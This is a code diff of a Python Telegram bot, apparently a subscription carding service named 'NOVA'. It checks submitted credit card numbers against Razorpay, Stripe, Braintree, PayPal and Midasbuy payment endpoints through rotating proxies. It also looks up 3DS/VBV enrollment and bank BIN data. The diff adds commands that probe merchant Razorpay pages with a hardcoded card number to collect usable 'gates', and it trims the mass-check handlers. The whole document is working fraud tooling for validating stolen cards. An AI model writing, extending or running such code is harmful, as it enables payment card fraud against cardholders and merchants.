+        label = "Challenge Required"
+    elif status == "AUTHENTICATE_SUCCESSFUL":
+        emoji = "🟢"
+        label = "Authenticated (Frictionless Pass)"
+    elif status == "AUTHENTICATE_FRICTIONLESS_FAILED":
+        emoji = "🟡"
+        label = "Frictionless Failed"
+    elif status == "VBV_ENROLLED":
+        emoji = "🔴"
+        label = "VBV Enrolled"
+    else:
+        emoji = "⚪"
+        label = status.replace("_", " ").title()
+
+    bank = bin_info.get('bank', 'UNKNOWN')
+    country = bin_info.get('country_name', 'UNKNOWN')
+    flag = bin_info.get('country_flag', '🇺🇳')
+    brand = bin_info.get('brand', 'UNKNOWN')
+    card_type = bin_info.get('type', 'UNKNOWN')
+
+    # Build message
+    msg = f"""<b>{emoji} 3DS CHECK</b>
+💳 <code>{cc}</code>
+
+🏦 {bank}
+🌍 {flag} {country}
+
+🔒 Enrolled: {'Y' if enrolled else 'N'}
+📋 Status: {label}
+🔑 Auth: {auth_desc}
+📦 Version: {version}
+📱 OTP Required: {'Yes' if otp_required else 'No'}
+🌐 Network: {network}
+
+⚡ <b>Bot by Unknownop</b>"""
+    return msg
+
 # ============================================================================
-# MAIN SETUP FUNCTION – ALL HANDLERS INSIDE
+# MAIN SETUP FUNCTION – all handlers
 # ============================================================================
 def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                           check_site_func, is_valid_response_func,
@@ -1360,7 +1424,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
     def extract_cc(text):
         import re
-        parts = []   # ✅ Ensure parts is always defined
+        parts = []
         cleaned = re.sub(r'[^\d|:./ ]', '', text)
         if '|' in cleaned:
             parts = cleaned.split('|')
@@ -1568,7 +1632,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         save_rz_sites(sites)
         safe_send(bot.reply_to, message, f"✅ Removed Razorpay site:\n{url}\nRemaining: {len(sites)}", parse_mode='HTML')
 
-        
     @bot.message_handler(commands=['listrz'])
     def list_rz_sites_cmd(message):
         sites = load_rz_sites()
@@ -1579,7 +1642,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         for site in sites:
             short_id = hashlib.md5(site.encode()).hexdigest()[:5]
             text += f"🆔 <code>{short_id}</code> → {site}\n"
-        safe_send(bot.reply_to, message, text, parse_mode='HTML')                          
+        safe_send(bot.reply_to, message, text, parse_mode='HTML')
+
     @bot.message_handler(commands=['rmrzid'])
     def remove_rz_site_by_id(message):
         user_id = message.from_user.id
@@ -1607,6 +1671,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         sites.remove(found)
         save_rz_sites(sites)
         safe_send(bot.reply_to, message, f"✅ Removed Razorpay site:\n<code>{found}</code>\nRemaining: {len(sites)}", parse_mode='HTML')
+
     @bot.message_handler(commands=['uploadrz'])
     def upload_rz_prompt(message):
         user_id = message.from_user.id
@@ -1617,7 +1682,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         user_sessions[user_id] = user_sessions.get(user_id, {})
         user_sessions[user_id]['awaiting_rz_file'] = True
 
-
+    # ============================================================================
+    # FIXED /cleanrz – now removes sites that return server errors (not just ERROR status)
+    # ============================================================================
     @bot.message_handler(commands=['cleanrz'])
     def clean_rz_sites_cmd(message):
         user_id = message.from_user.id
@@ -1637,6 +1704,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         if not proxies:
             proxies = []
 
+        # Expanded dead keywords (matches mass check)
         dead_keywords = [
             "the server encountered an error",
             "international payments not supported",
@@ -1655,8 +1723,11 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             "payment method not allowed",
             "sorry, we could not process",
             "something went wrong",
-            "authentication failed",                # ← NEW
-            "unknown",                              # ← catch any "Unknown – …"
+            "authentication failed",
+            "unknown",
+            "403 forbidden",
+            "waf block",
+            "error",
         ]
 
         kept_sites = []
@@ -1666,13 +1737,15 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         def test_site(site):
             proxy = random.choice(proxies) if proxies else None
             msg, status = check_razorpay(test_cc, proxy=proxy, site=site)
-            # Remove if status is ERROR and message matches dead keywords
-            if status == "ERROR" and any(kw in msg.lower() for kw in dead_keywords):
+
+            # If message contains any dead keyword -> remove
+            msg_lower = msg.lower()
+            if any(kw in msg_lower for kw in dead_keywords):
                 return site, False
-            # Also remove if the status is UNKNOWN – that means the gateway didn’t give a valid response
+            # Also remove if status is "UNKNOWN" (generic error)
             if status == "UNKNOWN":
                 return site, False
-            # Keep everything else (DECLINED, APPROVED, even other errors)
+            # Keep everything else (DECLINED, APPROVED, even other errors that are not dead)
             return site, True
 
         with ThreadPoolExecutor(max_workers=30) as executor:
@@ -1698,518 +1771,85 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             f"🗑️ Removed: {removed}\n"
             f"💎 Kept: {len(kept_sites)}",
             parse_mode='HTML')
-        
-    @bot.message_handler(commands=['cleanmyproxies'])
-    def handle_clean_my_proxies(message):
-        user_id = message.from_user.id
-        if not is_user_allowed(user_id) and user_id not in OWNER_ID:
-            access_denied(message, "You need an active subscription to clean proxies.")
-            return
-        user_proxies = get_user_proxies(user_id)
-        if not user_proxies:
-            safe_send(bot.reply_to, message, "You have no personal proxies to clean.")
-            return
-        safe_send(bot.reply_to, message, f"🧹 Cleaning your {len(user_proxies)} proxies...")
-        import threading
-        def clean_task():
-            live = validate_proxies_strict(user_proxies, bot, message)
-            if len(live) == len(user_proxies):
-                safe_send(bot.send_message, message.chat.id, "✅ All your proxies are live!")
-            else:
-                removed = len(user_proxies) - len(live)
-                save_user_proxies(user_id, live)
-                safe_send(bot.send_message, message.chat.id, f"✅ Removed {removed} dead proxies.\nYou now have {len(live)} live proxies.")
-        threading.Thread(target=clean_task).start()
 
-    @bot.message_handler(commands=['stop'])
-    def handle_stop(message):
-        chat_id = message.chat.id
+    # ============================================================================
+    # NEW /testrz and /uploadrzsites (for manual/bulk addition)
+    # ============================================================================
+    @bot.message_handler(commands=['testrz'])
+    def test_rz_site(message):
         user_id = message.from_user.id
-        set_stop(chat_id, user_id)
-        safe_send(bot.reply_to, message,
-            "⏸️ <b>Stop requested.</b>\n\n"
-            "• Pending cards cancelled.\n"
-            "• Current card finishes soon.\n"
-            "• Unchecked cards will be saved.\n\n"
-            "<i>Please wait...</i>",
-            parse_mode='HTML')
-
-    @bot.message_handler(commands=['vbv', '3ds'])
-    def handle_vbv_check(message):
-        user_id = message.from_user.id
-        if message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
-            access_denied(message, "You need a subscription to use this checker.")
+        if not is_user_allowed(user_id):
+            access_denied(message)
             return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
+
+        parts = message.text.split(maxsplit=1)
         if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Usage: /vbv <card>\nExample: /vbv 4012888888881881|12|2026|123", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
-            return
-        cc = ccs[0]
-        msg_check = safe_send(bot.reply_to, message, f"🔍 Checking 3DS status for <code>{cc}</code>...", parse_mode='HTML')
-        vbv_result = vbv_checker(cc)
-        bin_info = get_bin_info(cc.split('|')[0])
-        if vbv_result['status'] == 'NOT_ENROLLED':
-            status_text = "Passed ✅"
-        elif vbv_result['status'] == 'VBV_ENROLLED':
-            status_text = "OTP Required ⛔"
-        else:
-            status_text = f"{vbv_result['status']} ❌"
-        response_text = vbv_result.get('response', '')
-        result_msg = (
-            f"<b>🔹 3DS / VBV Lookup</b>\n"
-            f"💳 <code>{cc}</code>\n"
-            f"📋 Status: {status_text}\n"
-            f"📋 Response: {response_text}\n\n"
-            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-        )
-        if msg_check:
-            try:
-                safe_send(bot.edit_message_text, result_msg, message.chat.id, msg_check.message_id, parse_mode='HTML')
-            except:
-                safe_send(bot.send_message, message.chat.id, result_msg, parse_mode='HTML')
-        else:
-            safe_send(bot.send_message, message.chat.id, result_msg, parse_mode='HTML')
-
-    @bot.message_handler(commands=['rz'])
-    def handle_rz_single(message):
-        import html
-        user_id = message.from_user.id
-        if message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /rz <card>", parse_mode='HTML')
+            safe_send(bot.reply_to, message, "❌ Usage: /testrz <razorpay.me/url>")
             return
 
-        cc = extract_cc(parts[1])
-        if not cc:
-            safe_send(bot.reply_to, message, "❌ Invalid card format. Use CC|MM|YYYY|CVV", parse_mode='HTML')
+        url = parts[1].strip()
+        if not is_valid_razorpay_url(url):
+            safe_send(bot.reply_to, message, "❌ Invalid Razorpay URL. Must start with https://razorpay.me/")
             return
 
+        test_cc = "4031630690796056|08|2029|876"
         proxies = get_active_proxies(user_id)
         proxy = random.choice(proxies) if proxies else None
-        args = parts[1].split()
-        site = None
-        if len(args) > 1:
-            site = args[1]
-        if not site:
+
+        status_msg = safe_send(bot.reply_to, message, f"⏳ Testing site: {url} ...")
+        msg, status = check_razorpay(test_cc, proxy=proxy, site=url)
+
+        dead_keywords = [
+            "the server encountered an error",
+            "international payments not supported",
+            "account number is mandatory",
+            "temporarily blocked",
+            "merchant account",
+            "payment not allowed",
+            "invalid merchant",
+            "transaction not permitted",
+            "unable to process",
+            "merchant disabled",
+            "account suspended",
+            "bank not supported",
+            "payment method not allowed",
+            "sorry, we could not process",
+            "something went wrong",
+            "authentication failed",
+            "unknown",
+            "403 forbidden",
+        ]
+        msg_lower = msg.lower()
+        is_dead = any(kw in msg_lower for kw in dead_keywords)
+
+        if not is_dead and status != "UNKNOWN":
             sites = load_rz_sites()
-            if sites:
-                site = sites[0]
-
-        user_mention = f'<a href="tg://user?id={user_id}">{html.escape(message.from_user.first_name or "User")}</a>'
-        loading_msg = safe_send(bot.reply_to, message,
-            f"⏳ <b>NOVA IS WORKING . . . .</b>\n\n"
-            f"💳 Card    » <code>{cc}</code>\n"
-            f"🌐 Gateway » <b>Razorpay</b>\n"
-            f"🔍 Status  » <i>Loading Your Response...</i>\n\n"
-            f"⚡ Powered by  @Unknown_bolte",
-            parse_mode='HTML')
-
-        msg, status = check_razorpay(cc, proxy=proxy, site=site)
-
-        color = "🟢" if status == 'APPROVED' else "🔴" if status == 'DECLINED' else "⚠️"
-        bin_info = get_bin_info(cc.split('|')[0])
-        safe_msg = html.escape(msg)
-        result_text = (
-            f"<b>🔹 Razorpay ₹1 Check</b>\n"
-            f"💳 <code>{cc}</code>\n"
-            f"📋 {color} {safe_msg}\n\n"
-            f"🏦 Bank: {bin_info.get('bank','?')}\n"
-            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
-            f"👤 <b>Request by:</b> {user_mention}\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-        )
-
-        if loading_msg:
-            try:
-                safe_send(bot.edit_message_text, result_text, message.chat.id, loading_msg.message_id, parse_mode='HTML')
-            except:
-                safe_send(bot.send_message, message.chat.id, result_text, parse_mode='HTML')
+            if url not in sites:
+                sites.append(url)
+                save_rz_sites(sites)
+                safe_send(bot.edit_message_text,
+                    f"✅ Site <code>{url}</code> is **LIVE** (response: {msg[:60]}).\nAdded to Razorpay list.",
+                    message.chat.id, status_msg.message_id, parse_mode='HTML')
+            else:
+                safe_send(bot.edit_message_text,
+                    f"⚠️ Site <code>{url}</code> is LIVE but already in the list.",
+                    message.chat.id, status_msg.message_id, parse_mode='HTML')
         else:
-            safe_send(bot.send_message, message.chat.id, result_text, parse_mode='HTML')
+            safe_send(bot.edit_message_text,
+                f"❌ Site <code>{url}</code> is **DEAD** (response: {msg[:60]}). Not added.",
+                message.chat.id, status_msg.message_id, parse_mode='HTML')
 
-    @bot.message_handler(commands=['md'])
-    def handle_md_single(message):
+    @bot.message_handler(commands=['uploadrzsites'])
+    def upload_rz_sites_prompt(message):
         user_id = message.from_user.id
         if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
+            access_denied(message)
             return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /md <card>", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
-            return
-        cc = ccs[0]
-        proxies = get_active_proxies(user_id)
-        proxy = random.choice(proxies) if proxies else None
-        msg, status = check_midasbuy(cc, proxy=proxy)
-        color = "🟢" if status == 'APPROVED' else "🔴" if status == 'DECLINED' else "⚠️"
-        bin_info = get_bin_info(cc.split('|')[0])
-        safe_msg = html.escape(msg)
-        response = (
-            f"<b>🔹 Midasbuy Check</b>\n"
-            f"💳 <code>{cc}</code>\n"
-            f"📋 {color} {safe_msg}\n\n"
-            f"🏦 Bank: {bin_info.get('bank','?')}\n"
-            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-        )
-        safe_send(bot.reply_to, message, response, parse_mode='HTML')
+        safe_send(bot.reply_to, message, "📂 <b>Send a .txt file with one Razorpay URL per line.</b>\n\nI'll test each and add valid ones.", parse_mode='HTML')
+        user_sessions[user_id] = user_sessions.get(user_id, {})
+        user_sessions[user_id]['awaiting_rz_bulk_upload'] = True
 
-    # ============================================================
-    # FIXED /b3 COMMAND – NOW USES STRIPE AUTH (B3)
-    # ============================================================
-    @bot.message_handler(commands=['b3'])
-    def handle_b3_single(message):
-        user_id = message.from_user.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /b3 <card>", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
-            return
-        cc = ccs[0]
-
-        # Get proxy (required for Stripe Auth)
-        proxies = get_active_proxies(user_id)
-        proxy = random.choice(proxies) if proxies else None
-
-        # Use check_stripe_auth instead of check_braintree_api
-        msg, status = check_stripe_auth(cc, proxy=proxy)
-        bin_info = get_bin_info(cc.split('|')[0])
-        status_text = "Approved ✅" if status == 'APPROVED' else "Declined ❌" if status == 'DECLINED' else "Error ⚠️"
-        safe_msg = html.escape(msg)
-        result_msg = (
-            f"<b>🔹 Stripe B3 Auth</b>\n"
-            f"💳 <code>{cc}</code>\n"
-            f"📋 {status_text}\n"
-            f"📋 Response: {safe_msg}\n\n"
-            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-        )
-        safe_send(bot.reply_to, message, result_msg, parse_mode='HTML')
-
-    @bot.message_handler(commands=['br'])
-    def handle_braintree_single(message):
-        user_id = message.from_user.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /br <card>", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
-            return
-        cc = ccs[0]
-        msg, status = check_braintree_api(cc)
-        bin_info = get_bin_info(cc.split('|')[0])
-        status_text = "Approved ✅" if status == 'APPROVED' else "Declined ❌" if status == 'DECLINED' else "Error ⚠️"
-        safe_msg = html.escape(msg)
-        result_msg = (
-            f"<b>🔹 Braintree Auth (API)</b>\n"
-            f"💳 <code>{cc}</code>\n"
-            f"📋 {status_text}\n"
-            f"📋 Response: {safe_msg}\n\n"
-            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-        )
-        safe_send(bot.reply_to, message, result_msg, parse_mode='HTML')
-
-    @bot.message_handler(commands=['mrz'])
-    def handle_razor_mass_inline(message):
-        import threading
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        if is_user_busy(user_id):
-            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /mrz <card1> <card2> ... (max 10)", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid cards found.", parse_mode='HTML')
-            return
-        ccs = ccs[:10]
-        sites = load_rz_sites()
-        if not sites:
-            safe_send(bot.reply_to, message, "❌ No Razorpay sites. Add with /addrz.", parse_mode='HTML')
-            return
-        proxies = get_active_proxies(user_id)
-        if not proxies:
-            safe_send(bot.reply_to, message, "🚫 Proxy required for this gate.", parse_mode='HTML')
-            return
-        active_proxies = validate_proxies_strict(proxies, bot, message)
-        if not active_proxies:
-            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
-            return
-        if user_id not in OWNER_ID:
-            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
-            if remaining < len(ccs):
-                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
-                return
-        if not mass_check_semaphore.acquire(blocking=False):
-            safe_send(bot.reply_to, message, "⚠️ Too many global checks running. Please wait.")
-            return
-        set_user_busy(user_id, True)
-        start_msg = safe_send(bot.send_message, chat_id,
-            f"💎 <b>Razorpay Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies\n🛡️ {len(sites)} Sites",
-            parse_mode='HTML')
-        def mass_thread():
-            try:
-                process_razorpay_mass_check(
-                    bot, message, start_msg, ccs, sites, active_proxies,
-                    user_id, load_json_func, save_json_func, users_file
-                )
-            finally:
-                mass_check_semaphore.release()
-                set_user_busy(user_id, False)
-        threading.Thread(target=mass_thread).start()
-
-    @bot.message_handler(commands=['mmd'])
-    def handle_midas_mass_inline(message):
-        import threading
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        if is_user_busy(user_id):
-            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /mmd <card1> <card2> ... (max 10)", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid cards found.")
-            return
-        ccs = ccs[:10]
-        proxies = get_active_proxies(user_id)
-        if not proxies:
-            safe_send(bot.reply_to, message, "🚫 Proxy required for this gate.")
-            return
-        active_proxies = validate_proxies_strict(proxies, bot, message)
-        if not active_proxies:
-            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
-            return
-        if user_id not in OWNER_ID:
-            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
-            if remaining < len(ccs):
-                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
-                return
-        if not mass_check_semaphore.acquire(blocking=False):
-            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
-            return
-        set_user_busy(user_id, True)
-        start_msg = safe_send(bot.send_message, chat_id,
-            f"💎 <b>Midasbuy Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
-            parse_mode='HTML')
-        def mass_thread():
-            try:
-                process_gate_mass_check(
-                    bot, message, start_msg, ccs, check_midasbuy, "Midasbuy",
-                    active_proxies, user_id, load_json_func, save_json_func, users_file
-                )
-            finally:
-                mass_check_semaphore.release()
-                set_user_busy(user_id, False)
-        threading.Thread(target=mass_thread).start()
-
-    @bot.message_handler(commands=['mchk'])
-    def handle_stripe_auth_mass(message):
-        import threading
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        if is_user_busy(user_id):
-            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /mchk <card1> <card2> ... (max 10)", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid cards found.")
-            return
-        ccs = ccs[:10]
-        proxies = get_active_proxies(user_id)
-        if not proxies:
-            safe_send(bot.reply_to, message, "🚫 Proxy required for this gate.")
-            return
-        active_proxies = validate_proxies_strict(proxies, bot, message)
-        if not active_proxies:
-            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
-            return
-        if user_id not in OWNER_ID:
-            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
-            if remaining < len(ccs):
-                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
-                return
-        if not mass_check_semaphore.acquire(blocking=False):
-            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
-            return
-        set_user_busy(user_id, True)
-        start_msg = safe_send(bot.send_message, chat_id,
-            f"🔐 <b>Stripe Auth Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
-            parse_mode='HTML')
-        def mass_thread():
-            try:
-                process_gate_mass_check(
-                    bot, message, start_msg, ccs, check_stripe_auth, "Stripe Auth",
-                    active_proxies, user_id, load_json_func, save_json_func, users_file
-                )
-            finally:
-                mass_check_semaphore.release()
-                set_user_busy(user_id, False)
-        threading.Thread(target=mass_thread).start()
-
-    @bot.message_handler(commands=['msc'])
-    def handle_stripe_charge_mass(message):
-        import threading
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        if is_user_busy(user_id):
-            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /msc <card1> <card2> ... (max 10)", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid cards found.")
-            return
-        ccs = ccs[:10]
-        proxies = get_active_proxies(user_id)
-        if not proxies:
-            safe_send(bot.reply_to, message, "🚫 Proxy required for this gate.")
-            return
-        active_proxies = validate_proxies_strict(proxies, bot, message)
-        if not active_proxies:
-            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
-            return
-        if user_id not in OWNER_ID:
-            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
-            if remaining < len(ccs):
-                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
-                return
-        if not mass_check_semaphore.acquire(blocking=False):
-            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
-            return
-        set_user_busy(user_id, True)
-        start_msg = safe_send(bot.send_message, chat_id,
-            f"💸 <b>Stripe Charge Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
-            parse_mode='HTML')
-        def mass_thread():
-            try:
-                process_gate_mass_check(
-                    bot, message, start_msg, ccs, check_stripe5, "Stripe $5 Charge",
-                    active_proxies, user_id, load_json_func, save_json_func, users_file
-                )
-            finally:
-                mass_check_semaphore.release()
-                set_user_busy(user_id, False)
-        threading.Thread(target=mass_thread).start()
-
-    @bot.message_handler(commands=['mpp'])
-    def handle_paypal_mass(message):
-        import threading
-        user_id = message.from_user.id
-        chat_id = message.chat.id
-        if not is_user_allowed(user_id):
-            access_denied(message, "🚫 This gate is for premium users only.")
-            return
-        if is_user_busy(user_id):
-            safe_send(bot.reply_to, message, "⏳ You have an active check. Use /stop first.")
-            return
-        text = message.text.strip()
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            safe_send(bot.reply_to, message, "❌ Use: /mpp <card1> <card2> ... (max 10)", parse_mode='HTML')
-            return
-        ccs = extract_cards_from_text(parts[1])
-        if not ccs:
-            safe_send(bot.reply_to, message, "❌ No valid cards found.")
-            return
-        ccs = ccs[:10]
-        proxies = get_active_proxies(user_id)
-        if not proxies:
-            safe_send(bot.reply_to, message, "🚫 Proxy required for this gate.")
-            return
-        active_proxies = validate_proxies_strict(proxies, bot, message)
-        if not active_proxies:
-            safe_send(bot.reply_to, message, "❌ All your proxies are dead.")
-            return
-        if user_id not in OWNER_ID:
-            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
-            if remaining < len(ccs):
-                safe_send(bot.reply_to, message, f"❌ Daily limit exceeded. You have {remaining} cards left.")
-                return
-        if not mass_check_semaphore.acquire(blocking=False):
-            safe_send(bot.reply_to, message, "⚠️ Too many global checks running.")
-            return
-        set_user_busy(user_id, True)
-        start_msg = safe_send(bot.send_message, chat_id,
-            f"💵 <b>PayPal Mass Check</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
-            parse_mode='HTML')
-        def mass_thread():
-            try:
-                process_gate_mass_check(
-                    bot, message, start_msg, ccs, check_paypal_charge, "PayPal $1 Charge",
-                    active_proxies, user_id, load_json_func, save_json_func, users_file
-                )
-            finally:
-                mass_check_semaphore.release()
-                set_user_busy(user_id, False)
-        threading.Thread(target=mass_thread).start()
-
+    # Override the document handler to handle bulk upload
     @bot.message_handler(content_types=['document'])
     def unified_file_handler(message):
         user_id = message.from_user.id
@@ -2255,6 +1895,60 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
             return
 
+        if user_sessions.get(user_id, {}).get('awaiting_rz_bulk_upload'):
+            user_sessions[user_id]['awaiting_rz_bulk_upload'] = False
+            try:
+                file_name = message.document.file_name.lower()
+                if not file_name.endswith('.txt'):
+                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
+                    return
+                msg_loading = safe_send(bot.reply_to, message, "⏳ Processing Razorpay sites...", parse_mode='HTML')
+                file_info = bot.get_file(message.document.file_id)
+                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+                urls = [line.strip() for line in file_content.split('\n') if line.strip() and is_valid_razorpay_url(line.strip())]
+                if not urls:
+                    safe_send(bot.edit_message_text, "❌ No valid Razorpay URLs found.", message.chat.id, msg_loading.message_id)
+                    return
+
+                proxies = get_active_proxies(user_id)
+                test_cc = "4031630690796056|08|2029|876"
+                added = 0
+                skipped = 0
+
+                sites = load_rz_sites()
+                for idx, url in enumerate(urls, 1):
+                    proxy = random.choice(proxies) if proxies else None
+                    msg, status = check_razorpay(test_cc, proxy=proxy, site=url)
+
+                    dead_keywords = [
+                        "the server encountered an error", "international payments not supported",
+                        "account number is mandatory", "temporarily blocked", "merchant account",
+                        "payment not allowed", "invalid merchant", "transaction not permitted",
+                        "unable to process", "merchant disabled", "account suspended",
+                        "bank not supported", "payment method not allowed", "sorry, we could not process",
+                        "something went wrong", "authentication failed", "unknown", "403 forbidden"
+                    ]
+                    if any(kw in msg.lower() for kw in dead_keywords) or status == "UNKNOWN":
+                        skipped += 1
+                    else:
+                        if url not in sites:
+                            sites.append(url)
+                            added += 1
+
+                    if idx % 5 == 0 or idx == len(urls):
+                        safe_send(bot.edit_message_text,
+                            f"Testing {idx}/{len(urls)} ...\n✅ Added: {added}\n⛔ Skipped: {skipped}",
+                            message.chat.id, msg_loading.message_id)
+
+                save_rz_sites(sites)
+                safe_send(bot.edit_message_text,
+                    f"✅ Bulk Razorpay site upload complete!\n"
+                    f"Added: {added}\nSkipped (dead/invalid): {skipped}\nTotal sites: {len(sites)}",
+                    message.chat.id, msg_loading.message_id, parse_mode='HTML')
+            except Exception as e:
+                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
+            return
+
         if user_sessions.get(user_id, {}).get('awaiting_proxy_file'):
             try:
                 file_name = message.document.file_name.lower()
@@ -2290,6 +1984,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 user_sessions[user_id].pop('awaiting_proxy_file', None)
             return
 
+        # Fallback – normal file upload (cards)
         if not is_free_group and not is_user_allowed(user_id):
             access_denied(message, "You need an active subscription to upload files.")
             return
@@ -2370,49 +2065,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             logger.error(f"File upload error: {e}")
             safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
 
